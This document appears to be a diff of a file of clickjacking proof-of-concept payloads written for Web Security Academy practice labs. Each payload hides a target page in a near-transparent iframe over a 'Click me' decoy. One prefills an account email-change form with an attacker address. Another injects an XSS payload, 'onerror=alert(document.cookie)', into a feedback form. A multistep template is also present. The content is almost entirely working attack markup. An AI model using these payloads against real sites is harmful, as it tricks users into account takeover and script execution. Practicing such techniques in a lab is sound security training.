@@ -22,16 +22,75 @@
        position:relative;
        width:700px;
        height: 500px;
-       opacity: $opacity;
+       opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
-       top:300px;
-       left:60px;
+       top:450px;
+       left:65px;
        z-index: 1;
    }
 </style>
 <div>Test me</div>
 <iframe sandbox="allow-forms"
 src="https://ac811f651faa3baa811b0e1500770061.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
+
+<style>
+   iframe {
+       position:relative;
+       width:700px;
+       height: 500px;
+       opacity: 0.1;
+       z-index: 2;
+   }
+   div {
+       position:absolute;
+       top:450px;
+       left:65px;
+       z-index: 1;
+   }
+</style>
+<div>Click me</div>
+<iframe
+src="https://ac051f561eda3054810b1c6900970047.web-security-academy.net/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+
+<style>
+   iframe {
+       position:relative;
+       width:700px;
+       height: 500px;
+       opacity: 0.1;
+       z-index: 2;
+   }
+   div {
+       position:absolute;
+       top:450px;
+       left:65px;
+       z-index: 1;
+   }
+</style>
+<div>Click me</div>
+
+<style>
+   iframe {
+       position:relative;
+       width:700px;
+       height: 500px;
+       opacity: 0.1;
+       z-index: 2;
+   }
+.firstClick, .secondClick {
+       position:absolute;
+       top:400px;
+       left:65px;
+       z-index: 1;
+   }
+   .secondClick {
+       top:450px;
+       left:60px;
+   }
+</style>
+<div class="firstClick">Test me first</div>
+<div class="secondClick">Test me next</div>
+<iframe src="$url"></iframe>
